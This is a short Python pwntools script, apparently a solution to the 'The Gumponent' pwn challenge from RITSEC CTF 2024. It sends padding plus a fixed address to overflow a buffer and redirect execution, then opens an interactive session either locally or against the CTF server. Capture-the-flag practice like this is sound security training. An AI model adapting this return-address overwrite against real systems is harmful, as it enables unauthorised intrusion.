#!/usr/bin/env python3
import sys, os
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/CTF/RITSEC CTF 2024/pwn/The Gumponent/test_gumponent')
elf = ELF(TARGET)

def attach(r):
    if not REMOTE:
        bkps = []
        cmds = []

        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)
    r.recvline()
    r.sendline(b'A' * 0x20 + p64(0x401230))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('ctf.ritsec.club', 31746)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
